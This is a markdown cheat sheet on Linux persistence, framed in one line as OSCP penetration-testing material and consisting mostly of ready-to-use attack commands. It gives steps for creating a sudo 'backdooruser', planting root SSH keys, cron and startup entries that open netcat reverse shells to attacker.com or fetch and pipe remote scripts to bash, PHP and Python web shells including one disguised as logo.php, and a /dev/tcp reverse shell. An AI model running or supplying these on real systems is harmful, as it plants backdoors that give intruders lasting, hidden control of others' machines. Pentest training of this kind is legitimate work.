# Linux Persistence Techniques

This document outlines basic methods to maintain access to Linux systems during penetration testing engagements, focusing on techniques covered in the OSCP curriculum.

## Table of Contents

- [User Account Manipulation](#user-account-manipulation)
- [SSH Backdoors](#ssh-backdoors)
- [Cron Jobs](#cron-jobs)
- [Startup Scripts](#startup-scripts)
- [Web Shells](#web-shells)
- [Additional Resources](#additional-resources)

## User Account Manipulation

### Creating New Users

```bash
# Add new user with root privileges
useradd -m -s /bin/bash backdooruser
usermod -aG sudo backdooruser
passwd backdooruser

# Add user to sudo group on Debian/Ubuntu systems
adduser backdooruser sudo

# Add user to wheel group on CentOS/RHEL systems
usermod -aG wheel backdooruser
```

### Modifying Existing Users

```bash
# Change user shell
usermod -s /bin/bash user

# Add user to sudoers
usermod -aG sudo user
echo "user ALL=(ALL:ALL) ALL" >> /etc/sudoers.d/user

# Modify user password
echo 'user:password' | chpasswd
passwd user
```

## SSH Backdoors

### Authorized Keys

```bash
# Add SSH key to authorized_keys
mkdir -p /home/user/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EA..." >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys
chown -R user:user /home/user/.ssh

# Add SSH key to root user
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EA..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

### SSH Configuration Changes

```bash
# Add secondary port for SSH
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 2222" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## Cron Jobs

### Persistent Cron Jobs

```bash
# System-wide cron job
echo "* * * * * root nc -e /bin/bash attacker.com 4444" >> /etc/crontab

# User cron job
(crontab -l 2>/dev/null; echo "* * * * * nc -e /bin/bash attacker.com 4444") | crontab -

# Add to cron.d directory
echo "* * * * * root nc -e /bin/bash attacker.com 4444" > /etc/cron.d/system-update
```

### Less Obvious Cron Jobs

```bash
# Using wget to fetch and execute a script
echo "*/5 * * * * root wget -q -O- http://attacker.com/script.sh | bash" >> /etc/crontab

# Using curl to fetch and execute a script
echo "*/10 * * * * root curl -s http://attacker.com/script.sh | bash" >> /etc/crontab
```

## Startup Scripts

### RC Scripts

```bash
# Add to rc.local
echo "#!/bin/bash" > /etc/rc.local
echo "nc -e /bin/bash attacker.com 4444 &" >> /etc/rc.local
echo "exit 0" >> /etc/rc.local
chmod +x /etc/rc.local
```

### Bash Profile

```bash
# Add to .bashrc for user persistence
echo "nohup nc -e /bin/bash attacker.com 4444 &" >> ~/.bashrc

# Add to global profile
echo "nohup nc -e /bin/bash attacker.com 4444 &" >> /etc/profile
```

## Web Shells

### PHP Web Shell

```php
// Simple PHP web shell (shell.php)
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

```bash
# Deploy to common web directories
cp shell.php /var/www/html/images/logo.php
# Access via: http://target/images/logo.php?cmd=id
```

### Simple Netcat Reverse Shell from Web

```php
// Simple reverse shell in PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
?>
```

### Python Web Shell

```python
# Simple Python web shell (for CGI-enabled servers)
#!/usr/bin/python
import cgi
import subprocess

print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    output = subprocess.check_output(cmd, shell=True)
    print("<pre>")
    print(output)
    print("</pre>")
else:
    print("<form method='POST'>")
    print("<input type='text' name='cmd'>")
    print("<input type='submit' value='Execute'>")
    print("</form>")
```

## Additional Resources

- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [OSCP/PWK PEN-200 OSCP Course Tools](https://www.kali.org/tools/) 